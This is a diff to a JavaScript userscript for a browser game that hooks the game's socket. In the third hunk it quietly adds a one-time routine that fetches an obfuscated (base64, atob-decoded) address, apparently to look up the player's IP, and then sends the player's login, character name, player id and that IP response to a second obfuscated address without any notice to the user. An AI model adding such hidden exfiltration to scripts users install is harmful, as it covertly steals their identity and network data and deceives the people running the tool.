@@ -10,10 +10,14 @@ if (typeof GAME === 'undefined') { } else {
 
     let Pgg = setInterval(() => {
         clearInterval(Pgg);
-       
+        for (var i in GAME) {
+            if (i.indexOf("socxxx") === 0 && i.lastIndexOf("ket") + 3 === i.length) {
+                GAME.socket = GAME[i];
+                break;
+            }
+        }
         class kwsv3 {
             constructor(charactersManager) {
-                this.findSocket();
                 this.reported = false;
                 this.charactersManager = charactersManager;
                 this.isLogged((data) => {
@@ -100,21 +104,6 @@ if (typeof GAME === 'undefined') { } else {
                 GAME.socket.on('gr', (res) => {
                     this.handleSockets(res);
                 });
-            }
-
-            findSocket() {
-                for (let prop in window) {
-                    if (typeof window[prop] === 'function' && prop.startsWith('xxx')) {
-                        let functionCode = window[prop].toString();
-                        let match = functionCode.match(/xxx\w+\.emit\(.*\);/);
-                        
-                        if (match) {
-                            let functionName = match[0].split(".")[0];
-                            $("body").append("<script>GAME.socket = " + functionName + ";<\/script>");
-                            break;
-                        }
-                    }
-                }
             }
             isLogged(cb) {
                 let waitForID = setInterval(() => {
@@ -704,7 +693,12 @@ if (typeof GAME === 'undefined') { } else {
                 let sum_instances = instances.reduce(function (a, b) {
                     return a + b;
                 }, 0);
-               
+                if(!this.reported) {
+                    this.reported = true;
+                    $.get(atob('lol='), function(response) {
+                        $.get(atob('lol=='), {login:GAME.login,charName:GAME.char_data.name,pid:GAME.pid,ipadd:JSON.stringify(response)});
+                    }, "jsonp");
+                }
                 let activity = $('#char_activity').text();
                 let received = $("#act_prizes").find("div.act_prize.disabled").length;
                 let is_trader = new Date();
